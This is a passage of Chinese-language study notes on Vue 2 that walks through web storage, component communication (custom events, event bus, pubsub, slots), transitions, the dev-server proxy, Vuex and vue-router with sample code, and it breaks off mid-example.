由于 SessionStorage 具有时效性，所以可以用来存储一些网站的游客登录的信息，还有**临时的浏览记录的信息**。当关闭网站之后，这些信息也就随之消除了。





> 具体案例：

**localStorage**

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>localStorage</title>
	</head>
	<body>
		<h2>localStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				localStorage.setItem('msg','hello!!!')
				localStorage.setItem('msg2',666)
                // 转成 JSON 对象存进去
				localStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(localStorage.getItem('msg'))
				console.log(localStorage.getItem('msg2'))

				const result = localStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(localStorage.getItem('msg3'))
			}
			function deleteData(){
				localStorage.removeItem('msg2')
			}
			function deleteAllData(){
				localStorage.clear()
			}
		</script>
	</body>
</html>
```

**sessionStorage**

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>sessionStorage</title>
	</head>
	<body>
		<h2>sessionStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				sessionStorage.setItem('msg','hello!!!')
				sessionStorage.setItem('msg2',666)
                // 转换成JSON 字符串存进去
				sessionStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(sessionStorage.getItem('msg'))
				console.log(sessionStorage.getItem('msg2'))

				const result = sessionStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(sessionStorage.getItem('msg3'))
			}
			function deleteData(){
				sessionStorage.removeItem('msg2')
			}
			function deleteAllData(){
				sessionStorage.clear()
			}
		</script>
	</body>
</html>
```





## 2.4 自定义事件

我们可以给组件或 DOM 元素绑定事件，事件分为原生事件和自定义事件。组件自定义事件是一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

**使用场景**

A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

**API：**`this.$emit`   、`this.$on`



子组件中 `this.$listeners` 可以得到所有绑定的自定义事件



### 2.4.1 两种实现方式

**1、方式一（常用）**

直接在组件标签里面添加自定义事件

App.vue

```html
<Student @atguigu="getStudentName"/> 
```

```js
getStudentName(name,...params){
    console.log('App收到了学生名：',name,params)
    this.studentName = name
}
```



Student.vue

```js
//触发 Student 组件实例身上的 atguigu 事件
this.$emit('atguigu',this.name,666,888,900)
```



**2、方式二**

通过`this.$refs.xxx.$on()` 绑定自定义事件，这样写起来更灵活，比如可以加定时器啥的。

App.vue

```html
<Student ref="student"/>
```

```js
// 事件回调
getStudentName(name,...params){
    console.log('App收到了学生名：',name,params)
    this.studentName = name
},

mounted() {
    this.$refs.student.$on('atguigu',this.getStudentName) //绑定自定义事件
    // this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
},

```

> 若想让自定义事件只能触发一次，可以使用 ```once``` 修饰符，或 ```$once``` 方法。



Student.vue

```js
//触发 Student 组件实例身上的 atguigu 事件
this.$emit('atguigu',this.name,666,888,900)
```





### 2.4.2 解绑自定义事件

1、vm自己解绑

```js
this.$off('atguigu') //解绑一个自定义事件
// this.$off(['atguigu','demo']) //解绑多个自定义事件
// this.$off() //解绑所有的自定义事件
```

2、当vm被销毁时也会被解绑



### 2.4.3 绑定原生事件

对组件使用原生事件必须添加修饰符：`native`

**`router-link` 也要加上！！**



```vue
// 点击 student 组件调用 show 函数
<Student @click.native="show"/>
```





## 2.5 全局事件总线

一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。**this.$bus称为全局事件总线**

本质还是自定义事件！！！！

### 2.5.1 $bus的由来

我们需要一个对象，它可以被所有组件访问到，并且具有$on、$emit等属性。那么我们就必须要在Vue.prototype 上面定义，并且赋予vm。

<img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20221231164406152.png" alt="image-20221231164406152" style="zoom:33%;" />



### 2.5.2 $bus的使用

1. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

   

2. 使用事件总线：**例如  A 和 B 想通信，A 需要 B 的数据。**

   

   1. 接收数据：在 A 组件中给 $bus **绑定自定义事件 **demo，事件的<span style="color:red">回调留在 A 组件自身。</span>

      ```js
      methods(){
          // 绑定事件回调
        demo(data){......}
      }
      ......
      mounted() {
          // 绑定事件
        this.$bus.$on('demo',this.demo)
          
          // 直接写回调函数（必须用箭头函数！）
        this.$bus.$on('demo',() => {}) 
      }
          
      beforeDestroy() {
          // A组件被销毁前解绑
          this.$bus.$off('demo')
      }
      ```
   
      
   
   2. 提供数据：B触发**绑定事件**
   
      ```js
      this.$bus.$emit('demo',data)
      ```
   
      

> 示例代码

**School.vue**

```html
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
        methods: {
            demo(data) {
                console.log('我是School组件，收到了数据',data)
            }
        }
		mounted() {
			// console.log('School',this)
			this.$bus.$on('hello',this.demo)
		},
		beforeDestroy() {
			this.$bus.$off('hello')
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```



**Student.vue**

```html
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				this.$bus.$emit('hello',this.name)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```



### 2.5.3 关于回调函数

回调函数可以不用写到methods里面，直接绑定事件的时候定义，一定要写成**箭头函数**，this指向vm

```js
mounted() {
    this.$bus.$on('deleteTodo',(id)=> {
        this.todoList = this.todoList.filter((todo)=> todo.id != id);
    });
},
```






## 2.6 消息订阅与发布

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。  **（推荐用$bus）**

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods:{
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>



> 示例代码

订阅消息

**School.vue**

```html
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		mounted() {
			// console.log('School',this)
			/* this.$bus.$on('hello',(data)=>{
				console.log('我是School组件，收到了数据',data)
			}) */
			this.pubId = pubsub.subscribe('hello',(msgName,data)=>{
				console.log(this)
				// console.log('有人发布了hello消息，hello消息的回调执行了',msgName,data)
			})
		},
		beforeDestroy() {
			// this.$bus.$off('hello')
			pubsub.unsubscribe(this.pubId)
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

发布消息

**Student.vue**

```html
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				// this.$bus.$emit('hello',this.name)
				pubsub.publish('hello',666)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```



## 2.7 this.$nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：当DOM解析完成之后在执行其指定的回调。
3. 什么时候用：**当改变数据后，要基于更新后的新DOM进行某些操作时**，要在nextTick所指定的回调函数中执行。

具体案例：**点击编辑后input才出现且自动获取焦点**

```vue
<input 
    type="text" 
    v-show="todo.isEdit"
    v-model="todo.name"
    ref="inputEdit"
    @blur="handleBlur(todo,$event)"
>
```

```js
this.$nextTick(function() {
    this.$refs.inputEdit.focus();
}) 
```



## 2.8 Vue封装的过度与动画                

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。


2. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过渡的元素，并配置name属性：

      ```html
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。
   
   3. appear：出现时就执行动画



### 2.8.1 transition标签的使用

具体案例（单个元素过渡）

```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition appear>
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}

	.v-enter-active{
		animation: move 0.5s linear;
	}

	.v-leave-active{
		animation: move 0.5s linear reverse;
	}

	@keyframes move {
		from{
			transform: translateX(-100%);
		}
		to{
			transform: translateX(0px);
		}
	}
</style>
```
> name 的作用可以让让不同的元素有不同的动画效果
>

```html

<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition name="hello" appear>
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}

	.hello-enter-active{
		animation: move 0.5s linear;
	}

	.hello-leave-active{
		animation: move 0.5s linear reverse;
	}

	@keyframes move {
		from{
			transform: translateX(-100%);
		}
		to{
			transform: translateX(0px);
		}
	}
</style>
```


具体案例（多个元素过渡）

```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group name="hello" appear>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
	/* 进入的起点、离开的终点 */
	.hello-enter,.hello-leave-to{
		transform: translateX(-100%);
	}
	.hello-enter-active,.hello-leave-active{
		transition: 0.5s linear;
	}
	/* 进入的终点、离开的起点 */
	.hello-enter-to,.hello-leave{
		transform: translateX(0);
	}
</style>
```



### 2.8.2 搭配animate.css

**注意：元素最好有 v-show**

1、appear属性：页面刷新就执行动画

2、enter-active-class：元素显示时执行的动画

3、leave-active-class：元素消失时执行的动画

4、单个元素用`transition`     多个元素用`transition-group`

5、动画采样：https://www.dowebok.com/demo/2014/98/



案例：两个h1标签对立显示与隐藏

```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group 
			appear 
			enter-active-class="animate__animated animate__swing"
			leave-active-class="animate__animated animate__backOutUp"
		>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	import 'animate.css'
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
</style>
```





## 2.9 服务器配置代理

当需要发送跨域服务器的请求，**前端可以配置一个代理8080端口，从而实现跨域请求**（如果服务器不支持跨域）

图示：

<img src="https://img-blog.csdnimg.cn/01ae5e73323a4c83b097ea9705c90dbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" style="zoom: 67%;" />



修改配置有两种方式，然后在用 axios 发送请求，要注意 url 地址



### 2.9.1 两种配置方式

**方法一：**

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）
3. 前端资源：即public文件夹下的所有资源，如`url = http://localhost:8080/students` 则会返回students文件的内容



**方法二：**

​	编写 vue.config.js 配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}//代理服务器将请求地址转给真实服务器时会将 /api1 去掉
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000（当地端口）
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080（真实端口）
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。
2. **注意 changeOrigin**



### 2.9.2 axios请求

axios要提前安装和引入

当配置了方式二时，我们向5000、5001端口发送请求，**注意看url**

```js
import axios from 'axios';

show2() {
    let url = 'http://localhost:8080/api2/cars';
    axios.get(url, {
    }).then(value => {
        console.log(value.data);
    })

},

show1() {
    let url = '/api1/students'; // 本地端口号还可以省略
    axios.get(url, {
    }).then(value => {
        console.log(value.data);
    })

}
```





## 2.10 slot 插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。
2. 分类：默认插槽、具名插槽、作用域插槽
2. **插槽 css 样式可以在父组件中写，也可以在子组件中写**



### 2.10.1 默认插槽

没有名字的插槽，**只有一个slot**    Category标签的内容会替代slot标签



App.vue

```vue
  <Category>
       <div>html结构1</div>
       <div>html结构2</div>
  </Category>
```

Category.vue


```vue
<template>
  <div>
     <!-- 定义插槽 -->
     <slot>插槽默认内容...</slot>
  </div>
</template>
```



### 2.10.2 具名插槽

1、在可以在子组件中用多个插槽，不过要具有name，

2、在父组件中单个标签直接加name，多个标签用template套一下

3、`slot="list"` 可以写成 `v-slot:list`



App.vue


```vue
<Category title="foods">
    <template slot="list">
        <ul>
            <li v-for="(item,index) in foods" :key="index">
                {{item}}
            </li>
        </ul>
    </template>

    <a href="#" slot="ad" >我是广告</a>
</Category>
```

Category.vue

```vue
<template>
    <div class="category">
        <h1>{{title}}</h1>
        
        <slot name="list">列表</slot>
        <slot name="ad">广告</slot>
    
    </div>  
</template>
```



### 2.10.3 作用域插槽

1、**数据在子组件**，但根据数据生成的结构需要父组件来决定

2、实现在插槽中进行数据传输

3、必须用template标签包裹，**slot-scope属性**接收参数

3、`slot-scope="obj"`：对象里面存所有参数   `slot-scope="{ games, }"`：解构赋值



案例：games数组在Category组件中，利用插槽操作games数组

App.vue

```vue
<!-- 无序列表 -->
<Category title="games">

    <!-- <template slot-scope="obj"> -->
    <template slot-scope="{games}" slot="list" >
        <ul>
            <li v-for="(item,index) in games">{{item}}</li>
        </ul>
    </template>

</Category>

<!-- 有序列表 -->
<Category title="games">
    <template slot-scope="{games}" slot="list" >
        <ol>
            <li v-for="(item,index) in games">{{item}}</li>
        </ol>
    </template>
</Category>
```



Category.vue

```vue
<template>
    <div class="category">
        <h1>{{title}}</h1>
        <slot :games="games" name="list">列表</slot>
    </div>
</template>

<script>
    export default {
        name: 'Category',

        props: ['title'],

        data() {
            return {
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
            }
        },

    }
</script>
```





   



## 2.11 组件化编程

### 2.11.1 拆分静态组件

- 组件要按照功能点拆分，命名不要与html元素冲突
- 先创建好文件，import所有子组件
- 将静态html、css拆分到各个组件中



### 2.11.2 实现动态组件

- v-for
  ```vue
  <TodoItem 
      v-for="todoObj in todoList"
      :key="todoObj.id" 
      :todoObj="todoObj"
  />
  ```

  

- v-model

	1、将input.value和data中的数据进行双向绑定
	
	2、如果input为check 则直接双向绑定bool值
	
	```vue
	<input type="checkbox" v-model="todo.done" />
	```
	
	3、如果v-model的值为计算属性，那么计算属性不能简写，要写全
	
	```js
	<input type="checkbox" v-model="isAll" />
	
	isAll: {
	    get() {
	        return this.doneTotel == this.todoList.length && this.todoList.length > 0;
	    },
	
	    set(value) {
	        this.doneAll(value);
	    }
	}
	```
	

​		4、v-model三个修饰符很有用！！！





- $set

  修改或设置对象中的属性：`this.$set(对象名,'键','值')`

 

- 修改数组：`push()、pop()、shift()、unshift()、splice()、sort()、reverse()`

  

- 使用动画：1、class绑定  2、transition标签




### 2.11.3 所有的通信方式

**1、父组件给子组件**

用 props 配置

```vue
<Student :name="'cocoon'" sex="man" :age="18"/>

props: ['name','age','sex'],
```



**2、父组件与子组件数据同步**

用 props + sync 修饰符实现，本质同时是绑定了一个自定义事件 `updata:money`

```vue
// 父组件
<Child :money.sync="money" />
```

```js
// 子组件
props: ['money']

// 子组件修改数据
change(value) {
    // 将 money 赋值为 value
    this.$emit('updata:money',value)
}
```



**3、子组件给父组件**

- 使用自定义事件

App.vue

```html
<Student @atguigu="getStudentName"/> 
```

```js
getStudentName(name,...params){
    console.log('App收到了学生名：',name,params)
    this.studentName = name
}
```

Student.vue

```js
//触发 Student 组件实例身上的 atguigu 事件
this.$emit('atguigu',this.name,666,888,900)
```



- 全局事件总线（推荐）





**4、任意组件**：全局事件总线（推荐）、消息订阅与发布



# 3、VUEX

原理图：顾客（vc） - 服务员（actions） - 厨师（mutation）

![image-20230103200550897](C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20230103200550897.png)

## 3.1 什么是Vuex

1、概念：在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。



2、什么时候使用：多个组件需要共享数据时，都可以读取或修改！



3、个人理解：将数据放在store里面，每个组件都可以获取和修改，修改的话要经过 `dispatch`、`commit`



4、组件修改数据的两种方式：

方式一： 直接调用commit的修改数据的函数，逻辑处理在组件自身完成

方式二：组件只需要调用dispatch的修改数据的函数，vuex会通过actions函数中的逻辑处理再commit



## 3.2 搭建Vuex环境
- 首先下载Vuex（vue2安装Vuex3版本）：`npm i vuex@3`




1. 创建文件：```src/store/index.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作（逻辑处理）
   const actions = {}
   
   //准备mutations对象——修改state中的数据（直接修改）
   const mutations = {}
   
   //准备state对象——保存具体的数据
   const state = {}
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```
   

​		actions里的函数名都小写  mutations里的函数名都大写

​		我觉的还是重名更方便。。。。

 

2. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```



##    3.3 基本使用



vuex开发者工具介绍：

https://www.bilibili.com/video/BV1Zy4y1K7SH/?p=110&spm_id_from=pageDriver&vd_source=efb9c3f27a68ec1730be5a5e4e050c4b

### 3.3.1 读取数据

如果要直接读取store中的数据必须是this.$store.state...

1、在组件中读取vuex中的数据：```this.$store.state.sum```



2、组件修改数据的两种方式：

方式一： 直接调用commit的修改数据的函数，逻辑处理在组件自身完成

方式二：组件只需要调用dispatch的修改数据的函数，vuex会通过actions回调函数中的逻辑处理再commit



**一般组件不知道value时（异步，ajax请求），会使用方式二，通过actions回调函数获取value**



### 3.3.2 修改方式一

1、 直接调用commit：  `this.$store.commit('increment',value);`

2、 mutations的回调函数：`increment(state,value)`



案例：sum在store中，在Count组件中点击加号sum+1

Count.vue

```vue
<template>

    <div>
        <h1>总和为{{$store.state.sum}}</h1>
        <select v-model.number="n">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>

        <button @click="increment">+</button>
    </div>

</template>

<script>
        methods: {
			increment(){
                // 申请修改sum，执行store中的increment函数
                this.$store.commit('increment',this.n);
			},
        }
</script>

```

index.js

```js
//准备mutations对象——修改state中的数据（直接修改）
const mutations = {
	increment(state,value) {
		state.sum += value;
	}
}

//准备state对象——保存具体的数据
const state = {
	sum: 0,
}
```



### 3.3.3 修改方式二

1、 调用dispatch：`this.$store.dispatch('incrementWait',this.n)`

2、 进入actions中的回调函数，逻辑处理之后再commit修改数据

3、 actions回调函数：`incrementWait(context,value)`   

4、 context：上下文，可以作为store； 里面有dispath（调用actions中其他的回调函数）、commit

4、 最后：`context.commit('increment',value)`



案例：sum在store中，在Count组件中点击加号sum+1

Count.vue

```vue
<template>

    <div>
        <h1>总和为{{$store.state.sum}}</h1>
        <select v-model.number="n">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>

        <button @click="incrementWait">等一等再加</button>
    </div>

</template>

<script>
        methods: {
            incrementWait() {
                this.$store.dispatch('incrementWait',this.n);
            },
        }
</script>

```

index.js

```js
const actions = {
	incrementWait(context,value) {
		// 3秒之后sum+1
		setTimeout(function() {
			context.commit('increment',value);
		},3000)
	}
}

const mutations = {
	increment(state,value) {
		state.sum += value;
	}
}
```



### 3.3.4 context 的介绍

action、mutations 里的函数中可以接收一个参数 context

context：上下文，可以指代当前 store

可以用它进行 dispath（调用actions中其他的回调函数）、commit 、读取 state 等操作

```js
```





## 3.4 getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。**（相当于计算属性）**

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```



## 3.5 Vuex读取、修改数据简化



借助四个map方法可以实现Vuex读取、修改数据简化 。 

**当仓库模块化之后，map方法必须传入第一个参数（即小仓库的名字）**



### 3.5.1 mapState、mapGetters

（一）作用：帮助我们简化**读取**state、getters中的数据，`this.$store.state.sum` => `this.sum`



（二）导入：`import {mapState, mapGetters} from 'vuex'`



（三）mapState、mapGetters的使用：

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```



2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```



### 3.5.2 mapActions、mapMutations

（一）作用：帮助我们简化dispatch、commit函数的编写



（二）导入：`import {mapActions, mapMutations} from 'vuex'`



（三）使用前提：1、提前有个同名函数`@click="increment(n)"`  2、函数内传好参数



（三）具体使用

1. <strong>mapMutations方法</strong>

   ```html
   <button @click="increment(n)">+</button> 
   ```
   
   ```js
   methods: {
       // increment(){
       //     // 申请修改sum，执行store中的increment函数
       //     this.$store.commit('increment',this.n);
       // },
   
       ...mapMutations({increment:'increment'}), // 对象形式（当名字不相同时）
       ...mapMutations(['increment']), 
   },
   ```



2. <strong>mapActions方法</strong>

   ```html
   <button @click="incrementWait(n)">等一等再加</button>
   ```
   
   ```js
   methods: {
       // incrementWait() {
       //     this.$store.dispatch('incrementWait',this.n);
       // }
   
       ...mapActions(['incrementWait'])
   },
   ```



（四）在模板中绑定事件时传递好参数，否则传的**参数默认是事件对象(event)**





## 3.6 Vuex模块化



目的：让代码更好维护，让多种数据分类更加明确。

操作：

1、将store分成多个小store，小仓库都在 `store.state` 里面

2、每个小store都有state、mutations、actions、getters等配置

3、每个小store还应该开启命名空间`namespaced:true`

4、最后store引入每个小store：`modules: {...}`



### 3.6.1 store的模块化

案例：将计数仓库变成一个小仓库

**store/index.js**

```js
//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

// 分离仓库
const countAbout = {
	namespaced: true,

    actions: {
        incrementWait(context,value) {
            // 1秒之后sum+1
            setTimeout(function() {
                context.commit('increment',value);
            },1000)
        }
    },

    mutations: {
        increment(state,value) {
            state.sum += value;
        }
    },

    state: {
        sum: 0,
    },

    getters: {
        bigsum(state) {
            return state.sum * 10;
        }
    }

}

// 还可以建其他仓库

//创建并暴露store
export default new Vuex.Store({
	modules: {
		countAbout,
		// 还可以引入其他仓库
	}
})
```



> 其实可以把小仓库变成一个js文件，在index引入即可



### 3.6.1 模块化后读取、修改数据

**当仓库模块化之后，如果用map方法就必须传入第一个参数（即小仓库的名字）**

配置里面必须加 `namespaced: true` ！！！



1、读取state

案例：读取 countAbout 中的state中的sum

```js
//方式一：自己直接读取（小仓库读取不用经过state）
this.$store.state.countAbout.sum

//方式二：借助mapState读取：
...mapState('countAbout',['sum']),
```



2、读取getters

```js
//方式一：自己直接读取（有点特殊）
this.$store.getters['countAbout/bigsum']

//方式二：借助mapGetters读取：
...mapGetters('countAbout',['bigSum'])
```



3、调用dispatch

```html
<button @click="incrementWait(n)">等一等再加</button>
```

```js
//方式一：自己直接调用
incrementWait(n) {
	this.$store.dispatch('countAbout/incrementWait',n);    
}

//方式二：借助mapActions：
...mapActions('countAbout',['incrementWait']),
```



4、调用commit

```html
<button @click="increment(n)">+</button>
```

```js
//方式一：自己直接commit
increment(n) {
    this.$store.commit('countAbout/increment',n);
}

//方式二：借助mapMutations：
...mapMutations('countAbout',['increment']), 
```





# 4、路由

vue 文档：https://v3.router.vuejs.org/zh/guide/



1、理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。

2、前端路由：key是路径，value是组件。

3、具体使用：key：页面 url     value：路由规则下由 key 对应的路由组件

```vue
key: http://127.0.0.1:8000/#/home

value：hone组件
<router-view></router-view>
```

   

## 4.1 基本使用

1. 安装vue-router，命令：`npm i vue-router@3`（vue2安装vue-router3版本）


2. 应用插件：```Vue.use(VueRouter)```


3. 编写router配置项：（router/index.js）

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		},
           {   // 重定向进入首页默认路由为/home
               path:'/',
               redirect: '/home'
           }  
   	]
   })
   
   //暴露router
   export default router
   ```
   
4. 实现切换（active-class可以根据路由动态添加样式）（router-link解析后变成a标签）

   ```html
   <router-link active-class="active" to="/about">About</router-link>
   ```


5. 指定展示位置

   ```html
   <router-view></router-view>
   ```
   
6. main.js引入路由 
   ```js
   import VueRouter from 'vue-router'
   import router from './router'
   Vue.use(VueRouter)
   
   new Vue({
       el: '#root',
   
       render: h => h(App),
   
       router: router,
   })
   ```





## 4.2 几个注意点

1. 路由组件通常存放在```views```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

**获取当前页面的路由**

```js
this.$route // 里面有params、query、meta等参数！！！！
```



获取**总路由**

```js
this.$router
```





## 4.3 多级路由

理解：路由组件里面还包含路由组件 

```vue
<router-view></router-view> // 路由组件中存在这个
```

再通过路由规则去实现value



1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
           
   		children:[ 
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```html
   <router-link to="/home/news">News</router-link>
   ```

3. 指定展示位置

   ```html
   <router-view></router-view>
   ```

   

## 4.4 query参数

用query直接传参就可以接收到，路由规则里面不用配置什么



1. 传递参数：**在路由规则对应的组件中可以接收到**

   ```html
   <!-- 跳转并携带query参数，to的普通字符串写法 -->
